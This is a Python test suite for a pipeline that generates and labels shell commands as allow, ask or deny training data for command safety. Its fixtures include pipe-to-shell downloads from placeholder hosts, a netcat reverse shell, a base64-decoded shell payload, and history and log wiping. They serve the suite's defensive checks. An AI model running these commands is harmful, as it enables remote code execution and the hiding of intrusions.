"""Тесты каркаса. Запуск из корня: python3 -m unittest discover -s tests -v"""

import csv
import json
import shutil
import sys
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from cgen import clean, dedup, export, generate, neardup, report, validate  # noqa: E402
from cgen.config import load_config, run_dir  # noqa: E402
from cgen.io import FIELDS, read_jsonl  # noqa: E402
from cgen.seeds import SeedError, load_seeds  # noqa: E402

QUIET = lambda *a, **k: None  # noqa: E731


def seed(i, **over):
    s = {
        "seed_id": f"S{i}",
        "split": "train",
        "risk": "CAT-6.1",
        "family_id": f"F{i}",
        "prompt": f"тестовый seed {i}",
        "mechanism": "m",
        "source_kind": "abstract_synthetic_spec",
        "status": "approved_for_generation",
        "model_family_blocklist": [],
    }
    s.update(over)
    return s


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        shutil.copy(ROOT / "prompts/generation_v1.md", self.tmp / "t.md")
        shutil.copy(ROOT / "taxonomy.json", self.tmp / "tax.json")
        self.write_seeds([seed(i) for i in range(3)])

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def write_seeds(self, rows):
        (self.tmp / "seeds.jsonl").write_text(
            "".join(json.dumps(r, ensure_ascii=False) + "\n" for r in rows)
        )

    def cfg(self, **over):
        c = {
            "run_name": "r",
            "split": "train",
            "seeds_path": "seeds.jsonl",
            "output_dir": "runs",
            "taxonomy_path": "tax.json",
            "prompt": {"template": "t.md", "candidates_per_call": 3},
            "backend": {"provider": "mock"},
            "sampling": {"samples_per_seed": 2},
        }
        c.update(over)
        p = self.tmp / "cfg.json"
        p.write_text(json.dumps(c, ensure_ascii=False))
        return load_config(p)

    def run_all(self, cfg, **kw):
        generate.run(cfg, log=QUIET, **kw)
        for step in (clean.run, dedup.run, neardup.run, validate.run, export.run, report.run):
            step(cfg, log=QUIET)
        return run_dir(cfg)


class TestEndToEnd(Base):
    def test_clean_mock_full_run(self):
        out = self.run_all(self.cfg())
        with open(out / "dataset.csv", newline="") as f:
            rows = list(csv.DictReader(f))
        self.assertEqual(len(rows), 3 * 2 * 3)
        self.assertEqual(list(rows[0].keys()), FIELDS)
        self.assertTrue(all(r[k] for r in rows for k in FIELDS), "пустые ячейки")
        self.assertEqual((rows[0]["category"], rows[0]["risk"]), ("CAT-6", "CAT-6.1"))
        self.assertEqual({r["source"] for r in rows}, {"synthetic"})
        self.assertEqual(len(read_jsonl(out / "provenance.jsonl")), len(rows))
        rep = json.loads((out / "report.json").read_text())
        self.assertEqual(rep["final_rows"], len(rows))
        self.assertEqual(rep["seeds_with_zero_yield"], [])

    def test_dirty_mock_rejects_and_fixes(self):
        cfg = self.cfg(
            backend={"provider": "mock", "mode": "dirty"},
            sampling={"samples_per_seed": 12},
        )
        out = self.run_all(cfg)
        rep = json.loads((out / "report.json").read_text())
        all_reasons = {r for s in rep["rejected_reasons"].values() for r in s}
        for expected in (
            "invalid_json",
            "foreign_script_in_command",
            "duplicate_in_run",
            "bash_syntax_error",
            "bad_class:maybe",
        ):
            self.assertIn(expected, all_reasons)
        self.assertIn("removed_markdown_fence", rep["fixes_applied"])
        self.assertIn("unescaped_quotes", rep["fixes_applied"])

    def test_dry_run_builds_prompts_without_backend(self):
        cfg = self.cfg()
        generate.run(cfg, dry_run=True, log=QUIET)
        recs = read_jsonl(run_dir(cfg) / "raw.jsonl")
        self.assertTrue(all(r["status"] == "dry_run" for r in recs))
        self.assertIn("тестовый seed 0", recs[0]["messages"][1]["content"])
        self.assertNotIn("{{", recs[0]["messages"][1]["content"])


class TestResume(Base):
    def test_resume_continues_without_duplicates(self):
        cfg = self.cfg()
        generate.run(cfg, limit=2, log=QUIET)
        with self.assertRaises(ValueError):
            generate.run(cfg, log=QUIET)  # без --resume нельзя
        generate.run(cfg, resume=True, log=QUIET)
        keys = [
            (r["seed_id"], r["sample_idx"])
            for r in read_jsonl(run_dir(cfg) / "raw.jsonl")
        ]
        self.assertEqual(len(keys), 6)
        self.assertEqual(len(set(keys)), 6)

    def test_resume_refused_if_seeds_changed(self):
        cfg = self.cfg()
        generate.run(cfg, limit=1, log=QUIET)
        self.write_seeds([seed(i) for i in range(4)])
        with self.assertRaises(ValueError):
            generate.run(self.cfg(), resume=True, log=QUIET)

    def test_interrupted_tail_is_dropped(self):
        cfg = self.cfg()
        generate.run(cfg, limit=2, log=QUIET)
        with open(run_dir(cfg) / "raw.jsonl", "a") as f:
            f.write('{"seed_id": "S2", "sampl')  # недописанная строка
        generate.run(cfg, resume=True, log=QUIET)
        self.assertEqual(len(read_jsonl(run_dir(cfg) / "raw.jsonl")), 6)


class TestSeeds(Base):
    def test_bad_seeds_rejected(self):
        for bad in (
            seed(0, split="test"),
            seed(0, few_shot=["x"]),
            seed(0, source_commands=["x"]),
            seed(0, status="draft"),
            seed(0, risk="CAT-6"),
            seed(0, source_kind="real"),
        ):
            self.write_seeds([bad])
            with self.assertRaises(SeedError, msg=str(bad)):
                load_seeds(self.cfg())
        self.write_seeds([seed(0), seed(0)])
        with self.assertRaises(SeedError):
            load_seeds(self.cfg())


class TestSteps(Base):
    def test_dedup_against_external_test_file(self):
        cfg0 = self.cfg()
        generate.run(cfg0, log=QUIET)
        clean.run(cfg0, log=QUIET)
        first = read_jsonl(run_dir(cfg0) / "candidates.jsonl")[0]["command"]
        with open(self.tmp / "test.csv", "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(FIELDS)
            w.writerow(
                ["  " + first.replace(" ", "   ") + " "] + ["x"] * 8
            )  # отличается только пробелами
        cfg = self.cfg(dedup={"against": ["test.csv"]})
        kept, rej = dedup.run(cfg, log=QUIET)
        self.assertEqual([r["reason"] for r in rej], ["overlaps_external"])

    def test_clean_helpers(self):
        c = self.cfg()
        self.assertEqual(clean.clean_command('echo \\"a b\\"', c)[0], 'echo "a b"')
        self.assertEqual(
            clean.clean_command('echo "a" \\"b\\"', c)[0], 'echo "a" \\"b\\"'
        )  # смешанное не трогаем
        self.assertEqual(clean.clean_command("`ls -la`", c)[0], "ls -la")
        self.assertEqual(clean.clean_command("$ ls", c)[0], "ls")
        for bad, reason in (
            ("", "empty_command"),
            ("ls " + "a" * 3000, "command_too_long"),
            ("ls ünï", "non_ascii_command"),
            ("ls 文件", "foreign_script_in_command"),
        ):
            with self.assertRaises(ValueError) as e:
                clean.clean_command(bad, c)
            self.assertEqual(str(e.exception), reason)
        obj, fixes = clean.extract_json(
            '<think>x</think>Ответ:\n```json\n{"candidates": []}\n```'
        )
        self.assertEqual(obj, {"candidates": []})
        self.assertIn("removed_think_block", fixes)

    def test_bash_syntax_never_executes(self):
        marker = self.tmp / "must_not_exist"
        self.assertTrue(validate.bash_syntax_ok(f"touch {marker}"))
        self.assertFalse(marker.exists())
        self.assertFalse(validate.bash_syntax_ok("echo ("))
        self.assertTrue(validate.bash_syntax_ok("for i in 1 2; do echo $i; done"))

    def test_secret_detection(self):
        c = self.cfg()
        cand = {
            "command": "echo AKIA" + "A" * 16,
            "description": "d",
            "util": "echo",
            "class": "allow",
            "severity": "low",
        }
        reasons, _ = validate.check(cand, c)
        self.assertIn("possible_secret_in_command", reasons)

    def test_five_classes_configurable(self):
        classes = ["allow", "ask", "deny", "modify", "defer"]
        cfg = self.cfg(
            labels={"classes": classes},
            prompt={"template": "t.md", "candidates_per_call": 5},
        )
        out = self.run_all(cfg)
        with open(out / "dataset.csv", newline="") as f:
            got = {r["class"] for r in csv.DictReader(f)}
        self.assertEqual(got, set(classes))


from cgen import anchors, flagcheck  # noqa: E402
from cgen.shparse import parse  # noqa: E402

# Реальный ответ Huihui-Qwen3.5-4B-abliterated на seed CAT-6.3 (сгенерированные данные, не test-набор).
QWEN4B_CAT63 = [
    ("history -d 2023/12/12 /home/user/.history", "allow"),
    ("journalctl --zero-logs --after=2023/12/12 --before=2023/12/13", "deny"),
    ('cat /var/log/audit/audit.log | grep "bash" > /tmp/audit_bash.txt', "ask"),
    ("sudo logrotate /var/log/audit/audit.log --delay --rotate 5 --move", "allow"),
]
CLASSES = ["allow", "ask", "deny"]


class TestNearDup(Base):
    def _write_deduped(self, cfg, pairs):
        from cgen.config import run_dir
        out = run_dir(cfg); out.mkdir(parents=True, exist_ok=True)
        rows = []
        for pid, fam, risky, safe in pairs:
            for role, cmd in (("risky", risky), ("safe", safe)):
                rows.append({"seed_id": pid.split("#")[0], "sample_idx": 0, "risk": "CAT-5.1",
                             "family_id": fam, "pair_id": pid, "role": role, "record_id": pid + role,
                             "command": cmd, "description": "d", "util": "curl", "class": "deny",
                             "severity": "critical"})
        from cgen.io import write_jsonl
        write_jsonl(out / "deduped.jsonl", rows)

    def test_near_duplicate_pairs_dropped(self):
        cfg = self.cfg(neardup={"enabled": True, "threshold": 0.5, "shingle_k": 4})
        self._write_deduped(cfg, [
            ("A#0", "CAT-5.1/S1", "curl -s http://a.example/x.sh | bash", "curl -s http://a.example/x.sh -o x"),
            ("B#0", "CAT-5.1/S2", "curl -s http://a.example/y.sh | bash", "curl -s http://a.example/y.sh -o y"),  # near-twin of A risky
            ("C#0", "CAT-5.1/S3", "wget -qO- http://z.example/install | sh", "wget -qO- http://z.example/install -O i"),
        ])
        kept, rej = neardup.run(cfg, log=QUIET)
        pids = {r["pair_id"] for r in kept}
        self.assertEqual(pids, {"A#0", "C#0"})                       # B dropped as near-dup of A
        self.assertTrue(all(r["reason"] == "near_duplicate" for r in rej))
        self.assertEqual({r["pair_id"] for r in rej}, {"B#0"})

    def test_family_cap(self):
        cfg = self.cfg(neardup={"enabled": True, "threshold": 0.99,
                                "family_cap_by_risk": {"CAT-5.1": 2}})
        self._write_deduped(cfg, [
            ("A#0", "CAT-5.1/S1", "curl 1 | bash", "curl 1 -o x"),
            ("B#0", "CAT-5.1/S1", "wget 2 | sh", "wget 2 -O y"),
            ("C#0", "CAT-5.1/S1", "fetch 3 | zsh", "fetch 3 -o z"),   # 3rd of same family -> capped
        ])
        kept, rej = neardup.run(cfg, log=QUIET)
        self.assertEqual({r["pair_id"] for r in kept}, {"A#0", "B#0"})
        self.assertTrue(any(r["reason"].startswith("family_cap") for r in rej))

    def test_disabled_is_passthrough(self):
        cfg = self.cfg()  # neardup disabled by default
        self._write_deduped(cfg, [("A#0", "f", "curl 1 | bash", "curl 1 -o x"),
                                   ("B#0", "f", "curl 1 | bash", "curl 1 -o x")])
        kept, rej = neardup.run(cfg, log=QUIET)
        self.assertEqual(len(kept), 4); self.assertEqual(rej, [])


class TestFlagsAndAnchors(Base):
    def test_qwen4b_fake_flags_caught(self):
        p = [flagcheck.check(c)[0] for c, _ in QWEN4B_CAT63]
        self.assertEqual(p[0], ["bad_flag_value:history:-d"])
        self.assertIn("unknown_flag:journalctl:--zero-logs", p[1])
        self.assertEqual(p[2], [])
        self.assertEqual(
            p[3],
            [
                "unknown_flag:logrotate:--delay",
                "unknown_flag:logrotate:--rotate",
                "unknown_flag:logrotate:--move",
            ],
        )  # sudo снят

    def test_qwen4b_label_conflicts(self):
        w = [
            anchors.check({"command": c, "class": k}, CLASSES) for c, k in QWEN4B_CAT63
        ]
        self.assertEqual(w[0], ["label_conflict:history_clear:expected=ask/deny"])
        self.assertEqual(w[2], ["label_conflict:read_only:expected=allow"])
        self.assertEqual(w[3], [])

    def test_valid_flags_not_rejected(self):
        for cmd in [
            "tail -fn100 /var/log/syslog",
            "journalctl --since='1 hour ago' -u ssh --no-pager",
            "grep -rniE foo .",
            "du -sh .",
            "sed -i.bak s/a/b/ f",
            "history -d 15",
            "chattr -i f",
            "set +o history",
            "ls -la --color=auto",
            "head -5 f",
            "date -s '2020-01-01'",
            "env -i X=1 nohup tail -n5 x &",
            "echo $(date +%s) 2>&1 >> /tmp/x",
            "rm -rf --verb x",
        ]:
            self.assertEqual(flagcheck.check(cmd)[0], [], cmd)

    def test_syntax_quirks_not_rejected(self):
        # многострочные команды и heredoc: тело heredoc — данные, перевод строки — разделитель
        for cmd in ["history -c\nrm -f ~/.bash_history", "cat > /tmp/s.sh <<'EOF'\nrm -rf x\nEOF",
                    "grep x f \\\n  | tail -n 2", 'echo "a\nb" | grep -c b',
                    # символьный режим chmod, сигналы kill, nc из netcat-traditional, wget/ausearch -xx
                    "chmod -x f", "chmod -R 755 d", "kill -HUP 1", "kill -SIGTERM 1", "kill -9 1",
                    "nc -e /bin/sh 10.0.0.1 4444", "wget -np -nv https://example.com/", "wget -mnp https://example.com/", "ausearch -ui 1000 -ts recent"]:
            self.assertEqual(flagcheck.check(cmd)[0], [], cmd)
        self.assertEqual(flagcheck.check("cat <<EOF > f\n--bogus\nEOF\njournalctl --zero-logs")[0],
                         ["unknown_flag:journalctl:--zero-logs"])
        self.assertTrue(anchors.check({"command": "ls\nhistory -c", "class": "allow"}, CLASSES))

    def test_obfuscated_and_unknown_utils_not_rejected(self):
        self.assertEqual(flagcheck.check("a=rm; b=-rf; $a $b /tmp/x"), ([], []))
        self.assertEqual(flagcheck.check("r=r; m=m; ${r}${m} -rf /tmp"), ([], []))
        self.assertEqual(flagcheck.check("find / -name x -exec rm {} \\;"), ([], []))
        self.assertEqual(
            flagcheck.check("myutil --whatever"), ([], ["flags_unchecked:myutil"])
        )
        self.assertEqual(
            flagcheck.check("echo 'unterminated"), ([], ["flags_parse_failed"])
        )

    def test_nested_shell_checked(self):
        self.assertEqual(
            flagcheck.check('bash -c "journalctl --zero-logs"')[0],
            ["unknown_flag:journalctl:--zero-logs"],
        )
        self.assertEqual(
            [s.util for s in parse("diff <(ls a) <(ls b)")], ["ls", "ls", "diff"]
        )

    def test_anchor_rules(self):
        def conflict(cmd, cls):
            return anchors.check({"command": cmd, "class": cls}, CLASSES)

        self.assertTrue(conflict("echo cm0= | base64 -d | sh", "allow"))
        self.assertTrue(conflict("unset HISTFILE", "allow"))
        self.assertFalse(conflict("unset HISTFILE", "ask"))
        # верная метка у опасной команды не превращается в «только чтение -> allow»
        self.assertFalse(conflict("cat /dev/null > /home/dev/.bash_history", "deny"))
        self.assertFalse(conflict("cat x > .bash_history", "deny"))
        # запись не в /tmp — уже не «только чтение»
        self.assertFalse(conflict("grep foo /etc/passwd > /etc/x", "ask"))
        # выдуманные флаги: правило «только чтение» не применяется
        self.assertFalse(
            anchors.check(
                {"command": QWEN4B_CAT63[1][0], "class": "deny"},
                CLASSES,
                allow_read_only=False,
            )
        )
        # из прогона 4B: дописывание (>>) в лог — не стирание; journald без префикса systemd-
        self.assertFalse(
            conflict("cat /var/log/a.log | grep -v x >> /var/log/a.log.2", "allow")
        )
        self.assertTrue(conflict("sudo systemctl disable journald.service", "allow"))
        self.assertTrue(conflict(": > /var/log/kern.log", "allow"))
        self.assertFalse(conflict("confirm x /var/log/y", "allow"))
        # mock-команды правила не трогают
        self.assertFalse(conflict("echo mock-abc-0", "deny"))

    def test_flag_check_modes_and_review_queue(self):
        cand = {
            "command": "journalctl --zero-logs",
            "description": "d",
            "util": "journalctl",
            "class": "deny",
            "severity": "high",
        }
        reasons, _ = validate.check(cand, self.cfg())
        self.assertIn("unknown_flag:journalctl:--zero-logs", reasons)
        reasons, warns = validate.check(cand, self.cfg(validate={"flag_check": "warn"}))
        self.assertEqual(reasons, [])
        self.assertIn("unknown_flag:journalctl:--zero-logs", warns)
        reasons, warns = validate.check(cand, self.cfg(validate={"flag_check": "off"}))
        self.assertNotIn("unknown_flag:journalctl:--zero-logs", reasons + warns)
        with self.assertRaises(ValueError):
            self.cfg(validate={"flag_check": "maybe"})


PAIR_CONTRACT = {"CAT-6.1": {"risky": [["deny", "critical"]], "safe": [["allow", "low"]]}}


class TestPairFormat(Base):
    """Полные сиды коллег: шаблон v2 + ответ-пара {"risky","safe","review"}."""

    def pair_cfg(self, **over):
        shutil.copy(ROOT / "prompts/generation_v2.md", self.tmp / "t2.md")
        c = dict(prompt={"template": "t2.md", "version": "v2", "candidates_per_call": 1},
                 backend={"provider": "mock", "mode": "pair"}, sampling={"samples_per_seed": 4},
                 labels={"pair_contract": PAIR_CONTRACT}, export={"seed_column": "full_request"})
        c.update(over)
        return self.cfg(**c)

    def fake_raw(self, cfg, responses):
        out = run_dir(cfg)
        out.mkdir(parents=True, exist_ok=True)
        rows = [{"seed_id": "S0", "sample_idx": k, "risk": "CAT-6.1", "family_id": "F0",
                 "status": "ok", "raw": json.dumps(r, ensure_ascii=False)} for k, r in enumerate(responses)]
        (out / "raw.jsonl").write_text("".join(json.dumps(r, ensure_ascii=False) + "\n" for r in rows))

    def test_v2_passes_seed_verbatim(self):
        cfg = self.pair_cfg()
        generate.run(cfg, dry_run=True, log=QUIET)
        msgs = read_jsonl(run_dir(cfg) / "raw.jsonl")[0]["messages"]
        self.assertEqual(msgs[1]["content"], "тестовый seed 0")

    def test_pair_end_to_end(self):
        out = self.run_all(self.pair_cfg())
        with open(out / "dataset.csv", newline="") as f:
            rows = list(csv.DictReader(f))
        prov = read_jsonl(out / "provenance.jsonl")
        self.assertTrue(rows and len(rows) % 2 == 0)
        by_pair = {}
        for p, r in zip(prov, rows):
            by_pair.setdefault(p["pair_id"], {})[p["role"]] = r
        for sides in by_pair.values():
            self.assertEqual((sides["risky"]["class"], sides["risky"]["severity"]), ("deny", "critical"))
            self.assertEqual((sides["safe"]["class"], sides["safe"]["severity"]), ("allow", "low"))
        self.assertTrue(rows[0]["seed"].startswith("[system]"))
        self.assertIn("тестовый seed", rows[0]["seed"])
        refused = [r for r in read_jsonl(out / "rejected_clean.jsonl") if r["reason"] == "model_refused"]
        self.assertTrue(refused, "mock pair должен давать отказы")
        self.assertIn("review", prov[0])

    def test_pair_labels_and_rejections(self):
        cfg = self.pair_cfg()
        side = lambda cmd, **kw: {"command": cmd, "description": "d", "util": "echo", **kw}
        self.fake_raw(cfg, [
            {"risky": side("echo a1", expected_class="deny", severity="critical"), "safe": side("echo b1")},
            {"risky": side("echo a2", expected_class="allow", severity="low"), "safe": side("echo b2")},
            {"risky": side("echo a3"), "safe": {"command": "echo b3"}},
            {"risky": side("echo same"), "safe": side("echo same")},
            {"rejected": True, "reason": "нельзя доказать эффект"},
        ])
        kept, rej = clean.run(cfg, log=QUIET)
        got = {(c["pair_id"], c["role"]): (c["class"], c["severity"], c["warnings"]) for c in kept}
        self.assertEqual(got[("S0#0", "risky")][:2], ("deny", "critical"))     # допустимая метка модели
        self.assertNotIn(("S0#1", "risky"), got)                               # недопустимая -> пара уходит
        reasons = [r["reason"] for r in rej]
        self.assertIn("pair_label_conflict", reasons)
        self.assertTrue(any(r.startswith("pair_rejected:safe:missing_fields") for r in reasons))
        self.assertIn("pair_identical_commands", reasons)
        self.assertIn("model_refused", reasons)
        self.assertNotIn("S0#2", {c["pair_id"] for c in kept})                 # пара уходит целиком

    def test_no_contract_rejects_pair(self):
        cfg = self.pair_cfg(labels={"pair_contract": {}})
        self.fake_raw(cfg, [{"risky": {"command": "echo a", "description": "d", "util": "echo"},
                             "safe": {"command": "echo b", "description": "d", "util": "echo"}}])
        kept, rej = clean.run(cfg, log=QUIET)
        self.assertEqual(kept, [])
        self.assertIn("no_pair_contract:CAT-6.1", rej[0]["reason"])

    def test_orphan_side_dropped_and_label_conflict_reviewed(self):
        with open(self.tmp / "test.csv", "w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=FIELDS)
            w.writeheader()
            w.writerow({k: "x" for k in FIELDS} | {"command": "echo b1"})
        cfg = self.pair_cfg(dedup={"against": [str(self.tmp / "test.csv")]})
        side = lambda cmd, **kw: {"command": cmd, "description": "d", "util": "echo", **kw}
        self.fake_raw(cfg, [
            {"risky": side("echo a1"), "safe": side("echo b1")},   # safe совпал с test -> пара уходит
            {"risky": side("echo a2"), "safe": side("# TASK: x\n# FS: y\necho   b1")},  # тот же test под заголовком
            {"risky": side("echo a3"), "safe": side("echo b3")},
        ])
        for step in (clean.run, dedup.run, neardup.run, validate.run):
            step(cfg, log=QUIET)
        out = run_dir(cfg)
        kept = read_jsonl(out / "validated.jsonl")
        self.assertEqual({c["pair_id"] for c in kept}, {"S0#2"})
        dd = [r["reason"] for r in read_jsonl(out / "rejected_dedup.jsonl")]
        self.assertEqual(dd.count("overlaps_external"), 2)
        self.assertIn("pair_partner_rejected", [r["reason"] for r in read_jsonl(out / "rejected_validate.jsonl")])

    def test_neardup_against_test_checks_safe_side(self):
        """near-dup против test сверяет обе стороны пары: близнец test-строки на стороне safe убирает пару."""
        with open(self.tmp / "test.csv", "w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=FIELDS)
            w.writeheader()
            w.writerow({k: "x" for k in FIELDS} | {"command": "gitleaks detect --source . --no-git --redact"})
        cfg = self.pair_cfg(dedup={"against": [str(self.tmp / "test.csv")]},
                            neardup={"enabled": True, "threshold": 0.5, "shingle_k": 4,
                                     "against_test": True, "test_threshold": 0.5})
        side = lambda cmd: {"command": cmd, "description": "d", "util": "gitleaks"}
        self.fake_raw(cfg, [
            {"risky": side("gitleaks detect --report-path /tmp/r.json"),
             "safe": side("gitleaks detect --source src --no-git --redact")},       # safe ~ test
            {"risky": side("gitleaks protect --staged -v"), "safe": side("gitleaks version")},
        ])
        for step in (clean.run, dedup.run, neardup.run):
            step(cfg, log=QUIET)
        rej = read_jsonl(run_dir(cfg) / "rejected_neardup.jsonl")
        self.assertEqual({r["pair_id"] for r in rej if r["reason"] == "near_duplicate_test"}, {"S0#0"})

    def test_cyrillic_comment_lines_stripped(self):
        cfg = self.pair_cfg(clean={"strip_cyrillic_comment_lines": True})
        cmd = ("#!/bin/bash\n# TASK: проверить конфиг\n  # FS: conf.json — рабочий\n# english note\n"
               "# TASK: Replace app.cfg\n#FS: app.cfg exists\n# ENV: bash 5.2\n# tasks are fine here\ncp a b")
        out, fixes = clean.clean_command(cmd, cfg)
        self.assertEqual(out, "#!/bin/bash\n# english note\n# tasks are fine here\ncp a b")
        self.assertIn("removed_header_comment_lines", fixes)
        out, _ = clean.clean_command("# TASK: t\n# ASSUMPTIONS: GNU tar 1.34; cwd=/tmp/b\n#assumption: x\n"
                                     "# assumptions are listed above\ntar -tf a.tar", cfg)
        # ASSUMPTIONS: — заголовок (снимается); обычный комментарий со словом assumptions остаётся
        self.assertEqual(out, "# assumptions are listed above\ntar -tf a.tar")
        with self.assertRaisesRegex(ValueError, "non_ascii_command"):   # кириллица в коде остаётся отказом
            clean.clean_command("# TASK: x\necho 'привет'", cfg)
        with self.assertRaisesRegex(ValueError, "empty_command"):
            clean.clean_command("# TASK: только комментарий", cfg)
        with self.assertRaisesRegex(ValueError, "non_ascii_command"):   # по умолчанию выкл.: старое поведение
            clean.clean_command("# TASK: да\nls", self.pair_cfg())

    def test_label_vocab_and_util_normalization(self):
        cfg = self.pair_cfg()
        side = lambda cmd, util="echo", **kw: {"command": cmd, "description": "d", "util": util, **kw}
        self.fake_raw(cfg, [
            {"risky": side("echo a1", expected_class="risky/deny/critical"), "safe": side("echo b1", expected_class="safe")},
            {"risky": side("echo a2", expected_class="rce", severity="critical"), "safe": side("echo b2")},
            {"risky": side("ed a3", util="ed"), "safe": side("cp x y && ed b3", util="cp, ed")},
            {"risky": side("echo a4", expected_class="allow", severity="low"), "safe": side("echo b4")},
        ])
        kept, rej = clean.run(cfg, log=QUIET)
        got = {(c["pair_id"], c["role"]): c for c in kept}
        self.assertEqual((got[("S0#0", "risky")]["class"], got[("S0#0", "risky")]["severity"]), ("deny", "critical"))
        self.assertIn("label_vocab_ignored", got[("S0#0", "safe")]["fixes"])
        self.assertEqual(got[("S0#1", "risky")]["class"], "deny")          # «rce» — не метка, severity совпала
        self.assertEqual({got[("S0#2", r)]["util"] for r in ("risky", "safe")}, {"ed"})
        self.assertEqual([r["reason"] for r in rej], ["pair_label_conflict"])   # настоящий allow у risky — конфликт

    def test_util_mismatch_and_refusal_with_pair(self):
        cfg = self.pair_cfg()
        side = lambda cmd, util="echo": {"command": cmd, "description": "d", "util": util}
        self.fake_raw(cfg, [
            {"risky": side("echo a1"), "safe": side("printf b1", util="printf")},
            {"rejected": True, "reason": "x", "risky": side("echo a2"), "safe": side("echo b2")},
        ])
        kept, rej = clean.run(cfg, log=QUIET)
        self.assertEqual(kept, [])
        self.assertEqual(sorted(r["reason"] for r in rej), ["model_refused", "pair_util_mismatch"])

    def test_export_refuses_if_seeds_changed_after_generate(self):
        cfg = self.pair_cfg()
        generate.run(cfg, log=QUIET)
        for step in (clean.run, dedup.run, neardup.run, validate.run):
            step(cfg, log=QUIET)
        self.write_seeds([seed(i, prompt=f"изменённый seed {i}") for i in range(3)])
        with self.assertRaisesRegex(ValueError, "изменились после generate"):
            export.run(cfg, log=QUIET)

    def test_train_real_model_requires_dedup_against(self):
        with self.assertRaisesRegex(ValueError, "dedup.against"):
            self.cfg(backend={"provider": "openai_compatible", "base_url": "http://x", "model": "m"})

    def test_refusal_shapes_and_silent_labels(self):
        contract = {"CAT-6.1": {"risky": [["deny", "critical"], ["ask", "high"]], "safe": [["allow", "low"]]}}
        cfg = self.pair_cfg(labels={"pair_contract": contract})
        side = lambda cmd, **kw: {"command": cmd, "description": "d", "util": "echo", **kw}
        self.fake_raw(cfg, [
            {"rejected": "не получается"},                                  # отказ без схемы (CAT-5.x)
            {"risky": side("echo a1"), "safe": side("echo b1")},            # без метки, контракт неоднозначен
            {"risky": side("echo a2", expected_class="allow"), "safe": side("echo b2")},  # класс без severity
        ])
        kept, rej = clean.run(cfg, log=QUIET)
        self.assertEqual(kept, [])
        self.assertEqual([r["reason"] for r in rej], ["model_refused", "pair_label_conflict", "pair_label_conflict"])
        self.assertTrue(any("contract_ambiguous" in d for d in rej[1]["details"]))
        self.assertTrue(any(d.startswith("label_conflict:model=allow/?") for d in rej[2]["details"]))

    def test_family_contract_overrides_risk(self):
        """Контракт по family_id (граничный ask-сид) главнее контракта по risk; чужие семьи — по risk."""
        contract = {"CAT-6.1": {"risky": [["deny", "critical"]], "safe": [["allow", "low"]]},
                    "CAT-6.1/S19": {"risky": [["ask", "medium"]], "safe": [["allow", "low"]]}}
        cfg = self.pair_cfg(labels={"pair_contract": contract})
        side = lambda cmd, **kw: {"command": cmd, "description": "d", "util": "echo", **kw}
        out = run_dir(cfg)
        out.mkdir(parents=True, exist_ok=True)
        rows = [{"seed_id": sid, "sample_idx": 0, "risk": "CAT-6.1", "family_id": fam, "status": "ok",
                 "raw": json.dumps(resp, ensure_ascii=False)} for sid, fam, resp in [
            ("S19", "CAT-6.1/S19", {"risky": side("echo a1"), "safe": side("echo b1")}),
            ("S01", "CAT-6.1/S01", {"risky": side("echo a2"), "safe": side("echo b2")}),
            ("S19b", "CAT-6.1/S19", {"risky": side("echo a3", expected_class="deny"), "safe": side("echo b3")}),
        ]]
        (out / "raw.jsonl").write_text("".join(json.dumps(r, ensure_ascii=False) + "\n" for r in rows))
        kept, rej = clean.run(cfg, log=QUIET)
        got = {(c["seed_id"], c["role"]): (c["class"], c["severity"]) for c in kept}
        self.assertEqual(got[("S19", "risky")], ("ask", "medium"))
        self.assertEqual(got[("S19", "safe")], ("allow", "low"))
        self.assertEqual(got[("S01", "risky")], ("deny", "critical"))
        self.assertEqual([r["reason"] for r in rej], ["pair_label_conflict"])  # модель сказала deny вопреки сиду

    def test_pair_contract_key_format(self):
        bad = {"CAT-6.1 risky": {"risky": [["deny", "critical"]], "safe": [["allow", "low"]]}}
        with self.assertRaisesRegex(ValueError, "ключ не CAT-N.M"):
            self.pair_cfg(labels={"pair_contract": bad})


class _FakeServer(BaseHTTPRequestHandler):
    requests = []

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        _FakeServer.requests.append(
            {"path": self.path, "body": body, "auth": self.headers.get("Authorization")}
        )
        content = json.dumps(
            {
                "candidates": [
                    {
                        "command": f"echo srv-{len(_FakeServer.requests)}",
                        "description": "d",
                        "util": "echo",
                        "class": "allow",
                        "severity": "low",
                    }
                ]
            }
        )
        data = json.dumps(
            {
                "choices": [{"message": {"content": content}}],
                "usage": {"total_tokens": 1},
            }
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *a):
        pass


class TestOpenAICompatible(Base):
    def test_against_local_fake_server(self):
        srv = HTTPServer(("127.0.0.1", 0), _FakeServer)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            import os

            os.environ["CGEN_TEST_KEY"] = "k123"
            (self.tmp / "test.csv").write_text(",".join(FIELDS) + "\n" + ",".join(["x"] * len(FIELDS)) + "\n")
            cfg = self.cfg(
                backend={
                    "provider": "openai_compatible",
                    "base_url": f"http://127.0.0.1:{srv.server_port}/v1",
                    "model": "my-model",
                    "api_key_env": "CGEN_TEST_KEY",
                    "extra_body": {"top_k": 20},
                },
                dedup={"against": [str(self.tmp / "test.csv")]},
            )
            out = self.run_all(cfg)
        finally:
            srv.shutdown()
            srv.server_close()
        req = _FakeServer.requests[0]
        self.assertEqual(req["path"], "/v1/chat/completions")
        self.assertEqual(req["body"]["model"], "my-model")
        self.assertEqual(req["body"]["top_k"], 20)
        self.assertIn("seed", req["body"])
        self.assertEqual(req["auth"], "Bearer k123")
        manifest = json.loads((out / "manifest.json").read_text())
        self.assertNotIn("k123", json.dumps(manifest))
        with open(out / "dataset.csv", newline="") as f:
            self.assertEqual(len(list(csv.DictReader(f))), 6)


if __name__ == "__main__":
    unittest.main()


class ContaminationTest(unittest.TestCase):
    """Обвязка ответа модели в command (CAT-4, 23.11) отбраковывается; обычные комментарии в коде — нет."""

    BAD = [
        ("root@host:/opt/testbench/bin# dpkg-statoverride --add root root /opt/x 4755", "dpkg-statoverride"),
